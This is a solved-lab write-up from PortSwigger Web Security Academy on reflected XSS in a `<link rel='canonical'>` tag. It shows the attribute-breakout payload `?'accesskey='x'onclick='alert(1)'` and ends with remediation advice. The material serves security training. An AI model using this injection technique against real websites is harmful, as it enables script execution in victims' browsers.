# Lab: Reflected XSS in canonical link tag

## Overview

- **Category:** Cross-Site Scripting (Reflected XSS / Hidden Attribute Context)
- **Difficulty:** Practitioner
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This lab reflects the full current request URL inside the single-quoted `href` attribute of a `<link rel="canonical">` element located in the `<head>` section of the document. Because single quotes (`'`) are not encoded in the query string, we can break out of the `href` attribute and inject new attributes onto the `<link>` tag. Since `<link>` elements inside `<head>` are invisible and cannot be hovered or directly clicked with a mouse, we combine the `accesskey` attribute with an `onclick` handler to trigger JavaScript execution via a keyboard shortcut.

---

## Attack Scenario & Mental Model

```text
ATTACKER GOAL
  Execute alert(1) via Reflected XSS inside the <link rel="canonical"> tag
      ↓
VICTIM / TRIGGER
  Victim visits the crafted URL and presses the keyboard shortcut for accesskey="x"
  (Alt+Shift+X on Windows/Linux, Ctrl+Alt+X on macOS)
      ↓
SOURCE
  Full request URL / query string (`GET /?...`) reflected into `<head>`
      ↓
CONTEXT & ESCAPE ANALYSIS
  The server renders:
  <link rel="canonical" href='https://LAB-HOST/?USER_QUERY'/>
  Single quotes (`'`) are decoded and reflected without HTML encoding, allowing
  attribute breakout inside the `<link>` tag.
      ↓
INJECTION
  Appending `?'accesskey='x'onclick='alert(1)` to the URL breaks out of `href='...'`
  and attaches `accesskey='x'` and `onclick='alert(1)'` to the `<link>` element.
      ↓
SINK
  <link rel="canonical" href='https://LAB-HOST/?'accesskey='x'onclick='alert(1)'/>
      ↓
BROWSER BEHAVIOR
  Even though `<link>` inside `<head>` is not rendered visually in the viewport,
  pressing the `accesskey` shortcut (`Alt+Shift+X`) causes the browser to dispatch
  a synthetic `click` event to the element, firing its `onclick` handler.
      ↓
IMPACT
  Arbitrary JavaScript execution (`alert(1)`) in the victim's browser context.
```

---

## Step-by-Step Walkthrough

### 1. Identifying the Reflection Context
Inspected the HTML source of the home page (`GET /`) and found the canonical link tag inside `<head>`:

```html
<link rel="canonical" href='https://LAB-HOST/'/>
```

Tested how query parameters and single quotes are handled by navigating to:

```text
https://LAB-HOST/?'test
```

In the HTML response, the server decoded `%27` back into a literal single quote `'`, breaking out of the `href` attribute:

```html
<link rel="canonical" href='https://LAB-HOST/?'test'/>
```

### 2. Triggering Events on an Invisible `<link>` Element
Because `<link>` sits inside `<head>` with `display: none` behavior:
- Mouse events (`onmouseover`) cannot reach it.
- Standard focus events (`onfocus` + `autofocus`) do not fire on hidden metadata elements.
- However, assigning `accesskey='x'` binds a browser keyboard shortcut to the element, which dispatches an `onclick` event when pressed.

### 3. Executing the Payload
Navigated to the following URL:

```text
https://LAB-HOST/?'accesskey='x'onclick='alert(1)
```

This produced the following DOM element in `<head>`:

```html
<link rel="canonical" href='https://LAB-HOST/?'accesskey='x'onclick='alert(1)'/>
```

When the victim (or user pressing `Alt+Shift+X`) triggers the access key, `alert(1)` executes and the lab is marked **Solved**.

---

## Key Takeaways & Remediation

### Why Hidden Elements Can Still Be Exploited
Developers sometimes assume that reflecting input into non-visible `<head>` elements (such as `<link>` or `<meta>`) is lower risk if angle brackets `<` and `>` are blocked or encoded. However, attribute injection on hidden elements can still lead to XSS via browser features like `accesskey` + `onclick`, or stylesheet/preload hijacking.

### Remediation
- **Encode Quotes and Special Characters in URLs:** Properly URL-encode or HTML-encode single quotes (`'` → `&#x27;`), double quotes (`"` → `&quot;`), and angle brackets before inserting URL parameters into HTML attributes.
- **Avoid Reflecting Arbitrary Query Strings in Canonical Tags:** Canonical URLs should be constructed strictly from known-valid route parameters rather than echoing the raw request query string.
